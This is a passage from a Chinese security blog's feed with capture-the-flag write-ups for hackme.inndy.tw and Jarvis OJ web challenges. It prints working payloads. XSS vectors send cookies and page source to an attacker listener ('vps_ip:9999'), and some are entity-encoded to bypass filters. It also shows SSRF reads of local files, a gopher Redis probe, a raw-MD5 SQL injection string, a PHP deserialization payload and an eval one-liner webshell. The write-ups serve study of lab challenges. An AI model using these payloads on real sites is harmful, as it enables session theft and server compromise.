class="built_in">printf</span>(<span class="string">"Can not open file %s\n"</span>, flag);</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">ssize_t</span> readed = read(fd, buffer, <span class="keyword">sizeof</span>(buffer) - <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(readed &gt; <span class="number">0</span>) &#123;</span><br><span class="line">write(<span class="number">1</span>, buffer, readed);</span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那就用这个程序读 <code>flag</code> 吧。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> make_command(<span class="string">'$a=\'syste\';$b=\'m\';$a.=$b;$a(\'./flag3/meow ./flag3/flag3\');'</span>);</span><br></pre></td></tr></table></figure><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a><a href="https://webshell.hackme.inndy.tw/" target="_blank" rel="noopener">webshell</a></h2><p>这题挂掉了，修复了再做。</p><h2 id="command-executor"><a href="#command-executor" class="headerlink" title="command-executor"></a><a href="https://command-executor.hackme.inndy.tw/" target="_blank" rel="noopener">command-executor</a></h2><p>单独写 wp</p><h2 id="xssme"><a href="#xssme" class="headerlink" title="xssme"></a><a href="https://xssrf.hackme.inndy.tw/" target="_blank" rel="noopener">xssme</a></h2><blockquote><p>XSS admin to steal flag</p></blockquote><p>都强调了 <code>xss</code> ，那就是打管理员 <code>cookie</code> 了。</p><p>不过还是扫一遍目录看看，以防丢失重要信息。</p><p><img src="https://ws1.sinaimg.cn/large/de75fd55gy1g2w1ga3d3gj20a904bwew.jpg" alt></p><p>一登录进来就发现是个邮箱管理界面，而且<code>admin</code> 已经发了封欢迎邮件过来。</p><p>接下来就是给 <code>admin</code> 发封邮件，插入咱们的 <code>js</code> payload，把 <code>cookie</code> 偷过来。 </p><p>这里有个很有趣的点，可以自己给自己发邮件，这样就完全不用怀疑 <code>bot</code> 会出故障，自己打自己成功了再去打管理员是一个更好的选择。</p><p>题目很友好，直接提示了哪些字符不能用，而且显示了管理员是否阅读了该邮件。</p><p>简单尝试了一下，以下字符被过滤：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">script</span></span><br><span class="line">)</span><br><span class="line">onmouseover</span><br><span class="line">空格onload</span><br><span class="line">空格onerror</span><br><span class="line">&lt;iframe</span><br></pre></td></tr></table></figure><p>但还有个常用的：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg <span class="attribute">onload</span>=alert(1);&gt;</span><br><span class="line">&lt;svg/<span class="attribute">onload</span>=alert(1)&gt;</span><br><span class="line">&lt;svg/<span class="attribute">onload</span>=prompt(1)</span><br><span class="line">&lt;svg/<span class="attribute">onload</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span><br></pre></td></tr></table></figure><p>构造 <code>payload</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/<span class="attribute">onload</span>=<span class="string">"javascript:document.location='//vps_ip:9999?cookie='+document.cookie"</span>&gt;</span><br><span class="line"></span><br><span class="line">或者将 <span class="string">""</span> 内的内容 HTML 实体编码下</span><br><span class="line">&lt;svg/<span class="attribute">onload</span>=<span class="string">"javascript:document.location.href=('//vps_ip:9999?cookie='+document.cookie)"</span>&gt;</span><br><span class="line"></span><br><span class="line">如果没发现上面一些过滤是包含空格一起检测的，将失去大量合适 payload</span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">""</span>onerror="&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;"&gt;</span><br></pre></td></tr></table></figure><p>使用 xss 平台接收一下请求，或者直接用 nc 监听。</p><p><img src="https://ws1.sinaimg.cn/large/de75fd55gy1g2w107xescj20ml04sjrq.jpg" alt></p><h2 id="xssrf-leak"><a href="#xssrf-leak" class="headerlink" title="xssrf leak"></a><a href="https://xssrf.hackme.inndy.tw/" target="_blank" rel="noopener">xssrf leak</a></h2><blockquote><p>Steal flag from source code file</p></blockquote><p>提示是 flag 在源码里面，那我们先读一下页面的源代码看看。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/<span class="attribute">onload</span>=<span class="string">"javascript:document.location='//vps_ip:9999?cookie='+btoa(document.body.innerHTML)"</span>&gt;</span><br><span class="line"></span><br><span class="line">发现 innerHTML 被过滤，那就 HTML 编码一下</span><br><span class="line">&lt;svg/<span class="attribute">onload</span>=<span class="string">"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x6c;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6f;&amp;#x6e;&amp;#x3d;&amp;#x27;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x34;&amp;#x37;&amp;#x2e;&amp;#x31;&amp;#x30;&amp;#x31;&amp;#x2e;&amp;#x32;&amp;#x32;&amp;#x30;&amp;#x2e;&amp;#x32;&amp;#x34;&amp;#x31;&amp;#x3a;&amp;#x39;&amp;#x39;&amp;#x39;&amp;#x39;&amp;#x3f;&amp;#x63;&amp;#x6f;&amp;#x6f;&amp;#x6b;&amp;#x69;&amp;#x65;&amp;#x3d;&amp;#x27;&amp;#x2b;&amp;#x62;&amp;#x74;&amp;#x6f;&amp;#x61;&amp;#x28;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x62;&amp;#x6f;&amp;#x64;&amp;#x79;&amp;#x2e;&amp;#x69;&amp;#x6e;&amp;#x6e;&amp;#x65;&amp;#x72;&amp;#x48;&amp;#x54;&amp;#x4d;&amp;#x4c;&amp;#x29;"</span>&gt;</span><br></pre></td></tr></table></figure><p>拿到 HTML，有点残缺，自己改下标签。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"navbar navbar-expand-lg navbar-dark bg-dark d-flex"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"navbar-brand"</span> <span class="attr">href</span>=<span class="string">"index.php"</span>&gt;</span>XSSRF<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"navbar-nav"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-itebSI </span></span></span><br><span class="line">      &lt;a class=" nav-link" href="sendmail.php"&gt;Send Mail&lt;L2E &lt;/li&gt; &lt;li class="nav-itebSI </span><br><span class="line">      &lt;a class=" nav-link" href="mailbox.php"&gt;Mailbox&lt;L2E &lt;/li&gt; &lt;li class="nav-itebSI </span><br><span class="line">      &lt;a class=" nav-link" href="sentmail.php"&gt;Sent Mail&lt;L2E &lt;/li&gt; &lt;li class="nav-itebSI </span><br><span class="line">      &lt;a class=" nav-link" href="setadmin.php"&gt;Set Admin&lt;L2E &lt;/li&gt; &lt;li class="nav-itebSI </span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">" nav-link"</span> <span class="attr">href</span>=<span class="string">"request.php"</span>&gt;</span>Send Request<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                            &lt;/bGk &lt;/ul&gt; &lt;ul class="navbar-nav ml-auto"&gt;</span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-itebSI </span></span></span><br><span class="line">      &lt;span class=" navbar-texdCI Hello, admin (Administrator)&lt;/span&gt; &lt;/bGk &lt;li class="nav-item"&gt;</span><br><span class="line">            &lt;a class="nav-link" href="logout.php"&gt;Logout&lt;L2E &lt;/li&gt; &lt;/dWw &lt;/nav&gt; &lt;div class="containeciI </span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">" card text-white bg-darayI &lt;div class="</span><span class="attr">card-body</span>"&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">"card-titlZSI </span></span></span><br><span class="line"><span class="tag"><span class="string">            4          &lt;/h2&gt;</span></span></span><br><span class="line">          &lt;h4&gt;From: &lt;a href=" sendmail.php?to=jj"&gt;jj&lt;/a&gt;&lt;/aDQ &lt;div class="card-text"&gt;&lt;svg onload="javascript:document.location='http://vps_ip:9999?cookie='+btoa(document.body.innerHTMLKSI &lt;/sdmc &lt;/daXY </span><br><span class="line">        <span class="tag">&lt;/<span class="name">daXY</span> </span></span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">daXY</span></span></span><br></pre></td></tr></table></figure><p>发现有个 <code>request.php</code> ，无法直接访问，需要 <code>admin</code>。</p><p>想办法让真正的 <code>admin</code> 去访问一下，然后把相应的结果返回给我们。</p><p>既然都可以执行 <code>js</code> 代码了，那直接构造一个 <code>Ajax</code> 请求，这里用的是原生的 <code>Ajax</code>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">var x=new XMLHttpRequest();</span></span></span><br><span class="line"><span class="tag"><span class="string">x.onreadystatechange=function() &#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">    if (x.readyState==4 &amp;&amp; x.status==200) &#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">        document.location='//vps_ip:9999/?code='+btoa(x.responseText);</span></span></span><br><span class="line"><span class="tag"><span class="string">    &#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">&#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">x.open("</span><span class="attr">GET</span>","<span class="attr">request.php</span>",<span class="attr">true</span>);</span></span><br><span class="line"><span class="tag"><span class="attr">x.setRequestHeader</span>("<span class="attr">Content-type</span>","<span class="attr">application</span>/<span class="attr">x-www-form-urlencoded</span>");</span></span><br><span class="line"><span class="tag"><span class="attr">x.send</span>();</span></span><br><span class="line"><span class="tag">"&gt;</span></span><br></pre></td></tr></table></figure><p>得到 <code>request.php</code> 访问接口</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">"/request.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">      &lt;textarea name=<span class="string">"url"</span>&gt;&lt;/textarea&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>有用的只有这一部分，传的参数是<code>url</code>，有没可能是文件包含呢？用 <code>file://</code> 协议试试。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">var x=new XMLHttpRequest();</span></span></span><br><span class="line"><span class="tag"><span class="string">x.onreadystatechange=function() &#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">    if (x.readyState==4 &amp;&amp; x.status==200) &#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">        document.location='//vps_ip:9999/?code='+btoa(x.responseText);</span></span></span><br><span class="line"><span class="tag"><span class="string">    &#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">&#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">x.open("</span><span class="attr">POST</span>","<span class="attr">request.php</span>",<span class="attr">true</span>);</span></span><br><span class="line"><span class="tag"><span class="attr">x.setRequestHeader</span>("<span class="attr">Content-type</span>","<span class="attr">application</span>/<span class="attr">x-www-form-urlencoded</span>");</span></span><br><span class="line"><span class="tag"><span class="attr">x.send</span>("<span class="attr">url</span>=<span class="string">file:///var/www/html/config.php</span>");</span></span><br><span class="line"><span class="tag">"&gt;</span></span><br></pre></td></tr></table></figure><p>成功拿到 <code>flag</code>，并提示我们下一个 <code>flag</code> 在 Redis 里。</p><h2 id="xssrf-redis"><a href="#xssrf-redis" class="headerlink" title="xssrf redis"></a><a href="https://xssrf.hackme.inndy.tw/" target="_blank" rel="noopener">xssrf redis</a></h2><blockquote><p>Steal flag from redis</p></blockquote><p>有了上一题的 <code>ssrf</code> ，打内网 redis 也是水到渠成了。</p><p>先看一下之前的 <code>request.php</code> 源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require</span>(<span class="string">'common.php'</span>); </span><br><span class="line">admin_required(); </span><br><span class="line">$msg = []; </span><br><span class="line">$url = <span class="string">''</span>; </span><br><span class="line">$result = <span class="string">''</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123;</span><br><span class="line">    $url = $_POST[<span class="string">'url'</span>]; </span><br><span class="line">    $result = shell_exec(<span class="string">'curl -m 1 --connect-timeout 1 -s '</span> . escapeshellarg($url)); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造 payload 打下 Redis</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">gopher:</span><span class="comment">//127.0.0.1:25566/_info</span></span><br><span class="line"></span><br><span class="line">将之前发送的数据改下即可。</span><br><span class="line">x.send(<span class="string">"url=gopher://127.0.0.1:25566/_info"</span>);</span><br></pre></td></tr></table></figure><p>成功打到回显，看来就是未授权打 redis 了，其他的就是老套路了，具体利用方式见 <a href="[https://wywwzjj.top/2019/05/17/Redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8/](https://wywwzjj.top/2019/05/17/Redis-未授权访问相关利用/)">博客</a>。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;hide-and-seek&quot;&gt;&lt;a href=&quot;#hide-and-seek&quot; class=&quot;headerlink&quot; title=&quot;hide and seek&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://hackme.inndy.tw/&quot; target=&quot;_bla
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Jarvis OJ Writeup</title>
    <link href="https://wywwzjj.top/2019/02/02/Jarvis-OJ-Writeup/"/>
    <id>https://wywwzjj.top/2019/02/02/Jarvis-OJ-Writeup/</id>
    <published>2019-02-02T05:08:19.000Z</published>
    <updated>2019-04-04T01:55:58.142Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PORT-51"><a href="#PORT-51" class="headerlink" title="PORT 51"></a>PORT 51</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo curl --local-port 51 http://web.jarvisoj.com:32770/</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Web 100&lt;/title&gt;</span><br><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">body &#123;</span><br><span class="line">background:gray;</span><br><span class="line">text-align:center;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h3&gt;Yeah!! Here's your flag:PCTF&#123;&#125;&lt;/h3&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h2><blockquote><p>md5</p></blockquote><p>header 头里面发现 hint: “select * from `admin` where password=’”.md5($pass,true).”‘“</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">md5 ( string $str [, bool $raw_output = <span class="keyword">FALSE</span> ] ) : string</span><br><span class="line"><span class="comment">// raw 为 TRUE 时为 16 字符二进制格式，默认为 false 32 字符十六进制数</span></span><br></pre></td></tr></table></figure><p>搜索一下，发现有个牛逼的字符串： <code>ffifdyop</code></p><p><a href="https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html" target="_blank" rel="noopener">https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html</a></p><p><a href="http://www.am0s.com/functions/204.html" target="_blank" rel="noopener">http://www.am0s.com/functions/204.html</a></p><p>传入之后，最终的 sql 语句变为 select * from <code>admin</code> where password=’’or’6�]��!r,��b’</p><p>成功闭合，得到万能密码，登录即可。</p><h2 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h2><blockquote><p>反序列化</p></blockquote><p>通过 <code>/showimg.php?img=c2hvd2ltZy5waHA=</code> 可读取源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// showing.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$f = $_GET[<span class="string">'img'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($f)) &#123;</span><br><span class="line">$f = base64_decode($f);</span><br><span class="line"><span class="keyword">if</span> (stripos($f,<span class="string">'..'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> </span><br><span class="line">&amp;&amp; stripos($f,<span class="string">'\\'</span>)===<span class="keyword">FALSE</span>&amp;&amp; stripos($f,<span class="string">'pctf'</span>)===<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">readfile($f);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"File not found!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">$x = <span class="keyword">new</span> Shield();</span><br><span class="line"><span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">$x = unserialize($g);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $x-&gt;readfile();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// shield.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in pctf.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> $file;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span><br><span class="line">&amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造利用的 <code>pop</code> 链即可，<strong>payload</strong></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?class=O:<span class="number">6</span>:<span class="string">"Shield"</span>:<span class="number">1</span>:&#123;<span class="string">s:</span><span class="number">4</span>:<span class="string">"file"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"pctf.php"</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="inject"><a href="#inject" class="headerlink" title="inject"></a>inject</h2><blockquote><p>有反引号的注入</p></blockquote><p>详见 <a href="https://wywwzjj.top/2019/02/26/Jarvis-OJ-inject/">https://wywwzjj.top/2019/02/26/Jarvis-OJ-inject/</a></p><h2 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h2><blockquote><p>upload + lfi </p></blockquote><p>扫了一遍目录，没发现什么文件，尝试 filter 读源码，也失败了</p><p>主题界面是一个图片上传，再加一个展示界面</p><p>配置信息给的这么清晰，有点可疑，然而并没有找到什么有用的洞</p><p>Apache/2.4.18 (Unix) OpenSSL/1.0.2h PHP/5.6.21 mod_perl/2.0.8-dev Perl/v5.16.3</p><p>Warning: fopen(submi.php): failed to open stream: No such file or directory in /opt/lampp/htdocs/index.php on line 24</p><p>按理说是可以文件包含，php://filter/read=convert.base64-encode/resource=index</p><p>然而显示 Cross domain forbidden!，估计是加了啥子 waf，此路不通</p><p>fopen() 时应该是拼接了一个 “.php”，这里可以用 %00 绕过</p><p>fopen(index.jj): failed to open stream 绕过成功</p><p>图片只能上传 jpg ，所以直接抓包在后面再个一句话，然后用 fopen() 去包含</p><p>但是，注意是但是，这里有个坑，不能用 &lt;?php，有 waf，要用 <script language="php">eval($_POST[1])</script></p><p>然后 page=uploads/1552805580.jpg%00 自动出 flag，都不需要菜刀</p><p>这题出的太过死板，<?=?> 是可以的，居然没任何回显，专考 <script language="php"> 标签了，没意义</p><p>有时间自己改一改出个题</p><h2 id="api调用"><a href="#api调用" class="headerlink" title="api调用"></a>api调用</h2><blockquote><p> xxe 入门</p></blockquote><p>请设法获得目标机器/home/ctf/flag.txt中的flag值。</p><p>参考 <a href="https://blog.spoock.com/2016/11/15/jarvisoj-web-writeup-1/">https://blog.spoock.com/2016/11/15/jarvisoj-web-writeup-1/</a></p><p>常规系统里对接收的请求都会做限制，比如POST之以content-type的application/x-www-form-urlencoded接收，但在一些框架系统里，框架会自动帮开发者识别传入的数据</p><p> POST 提交数据的四种常见方式</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">application</span>/x-www-form-urlencoded </span><br><span class="line">multipart/form-data</span><br><span class="line"><span class="built_in">application</span>/json</span><br><span class="line"><span class="built_in">application</span>/xml</span><br></pre></td></tr></table></figure><p>比如：默认为application/x-www-form-urlencoded接收的我只需修改为 application/json</p><p>即可传入JSON格式的数据，XML同理</p><p>这将导致原本不存在xml解析的地方可能存在XXE漏洞</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">XHR</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">var</span> xhr;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> XMLHttpRequest();&#125;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">catch</span>(e) &#123;</span><br><span class="line"></span><br><span class="line">​            <span class="keyword">var</span> IEXHRVers =[<span class="string">"Msxml3.XMLHTTP"</span>,<span class="string">"Msxml2.XMLHTTP"</span>,<span class="string">"Microsoft.XMLHTTP"</span>];</span><br><span class="line"></span><br><span class="line">​            <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>,len=IEXHRVers.length;i&lt; len;i++) &#123;</span><br><span class="line"></span><br><span class="line">​                <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> ActiveXObject(IEXHRVers[i]);&#125;</span><br><span class="line"></span><br><span class="line">​                <span class="keyword">catch</span>(e) &#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line"></span><br><span class="line">​            &#125;</span><br><span class="line"></span><br><span class="line">​        &#125;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">return</span> xhr;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">​    evil_input = <span class="built_in">document</span>.getElementById(<span 